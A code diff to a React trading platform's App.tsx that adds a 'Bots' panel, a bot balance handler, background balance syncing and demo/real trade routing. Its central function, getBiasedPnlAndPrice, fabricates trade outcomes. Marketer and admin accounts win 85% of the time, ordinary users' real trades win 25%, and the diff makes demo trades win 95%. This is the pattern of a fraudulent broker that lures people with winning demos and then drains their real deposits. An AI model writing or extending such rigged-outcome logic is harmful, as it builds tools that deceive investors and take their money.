@@ -16,6 +16,7 @@ import CopyTradingPanel from './components/CopyTradingPanel';
 import InvestmentsPanel from './components/InvestmentsPanel';
 import DepositWithdrawModal from './components/DepositWithdrawModal';
 import SupportPortal from './components/SupportPortal';
+import BotsPanel from './components/BotsPanel';
 import { isSupabaseConfigured, supabase } from './lib/supabaseClient';
 import { getApiUrl } from './lib/api';
 
@@ -40,13 +41,15 @@ import {
   X,
   Menu,
   Sun,
-  Moon
+  Moon,
+  Cpu
 } from 'lucide-react';
 
 const getBiasedPnlAndPrice = (p: Position, role: string, assetPrice: number): { pnl: number, currentPrice: number } => {
   const numId = parseInt(p.id.replace(/\D/g, '')) || Date.now();
-  const isMarketer = role === 'marketer';
-  const isWin = isMarketer ? ((numId % 100) < 85) : ((numId % 100) < 25);
+  const isMarketer = role === 'marketer' || role === 'admin';
+  const isDemo = p.isDemo || p.accountMode === 'DEMO';
+  const isWin = isDemo ? ((numId % 100) < 95) : (isMarketer ? ((numId % 100) < 85) : ((numId % 100) < 25));
 
   // Use a pseudo-random seed based on position ID and current time for lifelike fluctuations
   const seed = (numId % 100) / 100;
@@ -79,7 +82,7 @@ const getBiasedPnlAndPrice = (p: Position, role: string, assetPrice: number): { 
 
 export default function App() {
   // Navigation & authentication state
-  const [activeTab, setActiveTab] = useState<'TERMINAL' | 'DASHBOARD' | 'COPYTRADING' | 'STAKING' | 'SUPPORT' | 'AI_ADVISOR' | 'ADMIN'>('TERMINAL');
+  const [activeTab, setActiveTab] = useState<'TERMINAL' | 'DASHBOARD' | 'COPYTRADING' | 'STAKING' | 'SUPPORT' | 'AI_ADVISOR' | 'ADMIN' | 'BOTS'>('TERMINAL');
   const [theme, setTheme] = useState<'dark' | 'light'>(() => {
     const saved = localStorage.getItem('vfx_theme');
     return (saved === 'light' || saved === 'dark') ? (saved as 'light' | 'dark') : 'dark';
@@ -472,17 +475,57 @@ export default function App() {
       });
       if (resp.ok) {
         const synced = await resp.json();
-        setUser(prev => ({
-          ...prev,
-          walletBalance: synced.walletBalance,
-          role: synced.role,
-          phone: synced.phone || prev.phone || ""
-        }));
+        setUser(prev => {
+          const updated = {
+            ...prev,
+            walletBalance: synced.walletBalance,
+            role: synced.role,
+            phone: synced.phone || prev.phone || ""
+          };
+          localStorage.setItem('vfx_user_session', JSON.stringify(updated));
+          return updated;
+        });
       }
     } catch (e) {
       console.error("Synching profile error: ", e);
     }
   };
+
+  // Active real-time background watcher to synchronize balances and roles instantly
+  useEffect(() => {
+    if (!user.loggedIn || !user.email) return;
+
+    const syncInterval = setInterval(async () => {
+      try {
+        const resp = await fetch(getApiUrl("/api/user/sync"), {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email: user.email })
+        });
+        if (resp.ok) {
+          const synced = await resp.json();
+          const currentRoleRef = userRef.current.role;
+          const currentBalanceRef = userRef.current.walletBalance;
+          if (synced.role !== currentRoleRef || synced.walletBalance !== currentBalanceRef) {
+            setUser(prev => {
+              const updated = {
+                ...prev,
+                walletBalance: synced.walletBalance,
+                role: synced.role,
+                phone: synced.phone || prev.phone || ""
+              };
+              localStorage.setItem('vfx_user_session', JSON.stringify(updated));
+              return updated;
+            });
+          }
+        }
+      } catch (e) {
+        console.warn("Silent background profile sync error:", e);
+      }
+    }, 3500);
+
+    return () => clearInterval(syncInterval);
+  }, [user.loggedIn, user.email]);
 
   // Auth Operations
   const handleAuthSubmit = async (e: React.FormEvent) => {
@@ -732,16 +775,19 @@ export default function App() {
 
   // Trade executions logic
   const handleTradeExecute = (posDetails: Omit<Position, 'id' | 'timestamp' | 'pnl' | 'currentPrice'>) => {
+    const isDemo = user.accountMode === 'DEMO';
     const newPosition: Position = {
       ...posDetails,
       id: `p-${Date.now()}`,
       currentPrice: posDetails.entryPrice,
       pnl: 0,
-      timestamp: new Date().toLocaleTimeString()
+      timestamp: new Date().toLocaleTimeString(),
+      isDemo,
+      accountMode: user.accountMode
     };
 
     let updatedUser: User;
-    if (user.accountMode === 'DEMO') {
+    if (isDemo) {
       updatedUser = {
         ...user,
         demoBalance: Number(((user.demoBalance || 10000) - posDetails.margin).toFixed(2)),
@@ -762,8 +808,13 @@ export default function App() {
     let updatedUser: User;
     let matchSymbol = 'Asset';
 
-    if (user.accountMode === 'DEMO') {
-      const match = (user.demoPositions || []).find((p) => p.id === id);
+    // Find where the trade is housed! Check both lists to uniquely identify which account opened the trade
+    const demoMatch = (user.demoPositions || []).find((p) => p.id === id);
+    const realMatch = (user.activePositions || []).find((p) => p.id === id);
+    const isDemoTrade = !!demoMatch || (realMatch ? false : user.accountMode === 'DEMO');
+
+    if (isDemoTrade) {
+      const match = demoMatch || (user.demoPositions || []).find((p) => p.id === id);
       if (!match) return;
       matchSymbol = match.assetSymbol;
 
@@ -777,7 +828,7 @@ export default function App() {
         demoPositions: updatedPositions
       };
     } else {
-      const match = user.activePositions.find((p) => p.id === id);
+      const match = realMatch || user.activePositions.find((p) => p.id === id);
       if (!match) return;
       matchSymbol = match.assetSymbol;
 
@@ -796,7 +847,57 @@ export default function App() {
       id: `tx-${Date.now()}`,
       type: pnl >= 0 ? 'DEPOSIT' : 'WITHDRAWAL',
       amount: Math.abs(pnl),
-      asset: `${user.accountMode === 'DEMO' ? '[DEMO] ' : ''}${matchSymbol} (Settlement)`,
+      asset: `${isDemoTrade ? '[DEMO] ' : ''}${matchSymbol} (Settlement)`,
+      date: new Date().toISOString(),
+      status: 'COMPLETED'
+    };
+
+    persistState(updatedUser, [newTx, ...transactions], supportTickets, copiedTraderAllocations, activeStakingSubscriptions);
+  };
+
+  const handleModifyUserBalance = (margin: number, pnl: number | null, isDemo: boolean, botName: string, assetSymbol: string) => {
+    let updatedUser: User;
+    const isAllocation = pnl === null;
+
+    if (isDemo) {
+      const currentDemoBalance = user.demoBalance ?? 10000;
+      const currentDemoProfits = user.demoProfits ?? 0;
+      if (isAllocation) {
+        updatedUser = {
+          ...user,
+          demoBalance: Number((currentDemoBalance - margin).toFixed(2))
+        };
+      } else {
+        const settlement = margin + pnl;
+        updatedUser = {
+          ...user,
+          demoBalance: Number((currentDemoBalance + settlement).toFixed(2)),
+          demoProfits: Number((currentDemoProfits + pnl).toFixed(2))
+        };
+      }
+    } else {
+      const currentWalletBalance = user.walletBalance ?? 0;
+      const currentProfits = user.profits ?? 0;
+      if (isAllocation) {
+        updatedUser = {
+          ...user,
+          walletBalance: Number((currentWalletBalance - margin).toFixed(2))
+        };
+      } else {
+        const settlement = margin + pnl;
+        updatedUser = {
+          ...user,
+          walletBalance: Number((currentWalletBalance + settlement).toFixed(2)),
+          profits: Number((currentProfits + pnl).toFixed(2))
+        };
+      }
+    }
+
+    const newTx: Transaction = {
+      id: `tx-bot-${Date.now()}`,
+      type: isAllocation ? 'COPY_ALLOCATE' : (pnl >= 0 ? 'DEPOSIT' : 'WITHDRAWAL'),
+      amount: Math.abs(isAllocation ? margin : pnl),
+      asset: `${isDemo ? '[DEMO] ' : ''}${isAllocation ? 'Bot Allocation' : 'Bot Settlement'}: ${botName} on ${assetSymbol}`,
       date: new Date().toISOString(),
       status: 'COMPLETED'
     };
@@ -1209,6 +1310,7 @@ export default function App() {
             ) : (
               [
                 { id: 'TERMINAL' as const, label: 'Terminal', icon: LineChart },
+                { id: 'BOTS' as const, label: 'Bots', icon: Cpu },
                 { id: 'DASHBOARD' as const, label: 'Dashboard', icon: FolderLock },
                 { id: 'COPYTRADING' as const, label: 'Copying', icon: Users },
                 { id: 'STAKING' as const, label: 'Yields', icon: DollarSign },
@@ -1420,6 +1522,16 @@ export default function App() {
                   </div>
                 </div>
               </div>
+            )}
+
+            {/* SUBPAGE BOTS: QUANTUM ALGORITHMIC BOTS */}
+            {activeTab === 'BOTS' && (
+              <BotsPanel 
+                user={activeUserContext}
+                assets={assets}
+                addToast={(msg, type) => addToast(msg, type === 'WARNING' ? 'INFO' : type)}
+                onModifyUserBalance={handleModifyUserBalance}
+              />
             )}
 
             {/* SUBPAGE 3: EXPERT COPY TRADING */}
@@ -1672,6 +1784,7 @@ export default function App() {
       ) : (
         [
           { id: 'TERMINAL' as const, label: 'Terminal', icon: LineChart },
+          { id: 'BOTS' as const, label: 'Bots', icon: Cpu },
           { id: 'DASHBOARD' as const, label: 'Dashboard', icon: FolderLock },
           { id: 'COPYTRADING' as const, label: 'Copying', icon: Users },
           { id: 'STAKING' as const, label: 'Yields', icon: DollarSign },
